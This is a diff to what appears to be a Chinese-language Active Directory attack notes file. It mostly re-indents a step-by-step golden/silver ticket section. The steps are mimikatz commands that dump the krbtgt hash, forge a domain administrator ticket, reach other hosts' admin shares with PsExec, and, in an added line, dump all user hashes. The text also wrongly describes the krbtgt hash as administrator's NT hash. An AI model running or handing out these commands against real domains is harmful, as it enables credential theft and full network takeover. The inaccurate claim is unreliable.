@@ -252,13 +252,14 @@ GetNPUser.py会完成以上操作。
 
  5、gold /silver ticket attacker 
  
- 需要获取一个域管权限
- 1、使用mimikatz.exe ,
- 2、privilege::debug 打开输出模式  
- 3、lsadump::lsa /inject /name:krbtgt   dump krgtgt hash ,准备用来金银票攻击
- 4、kerberos::golden /user:administrator /domain:test.local /sid:S-1-5-21-XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX /krbtgt:0767ccd06e79853318f25aeb08ff83e2 /id:500
-    krbtgt 是administrator的nt hash
- 5、用生成的票据访问其他机器
-    misc::cmd
-    dir \\DESKTOP-1\c$
-    psExec.exe \\DESKTOP-1 cmd.exe
+	 需要获取一个域管权限
+ 	1、使用mimikatz.exe ,
+ 	2、privilege::debug 打开输出模式  
+ 	3、lsadump::lsa /inject /name:krbtgt   dump krgtgt hash ,准备用来金银票攻击
+ 	4、kerberos::golden /user:administrator /domain:test.local /sid:S-1-5-21-XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX /krbtgt:0767ccd06e79853318f25aeb08ff83e2 /id:500
+    	krbtgt 是administrator的nt hash
+ 	5、用生成的票据访问其他机器
+    	misc::cmd
+    	dir \\DESKTOP-1\c$
+    	psExec.exe \\DESKTOP-1 cmd.exe
+  6、mimikatz.exe  dump所有用户hash   ::lsa /patch
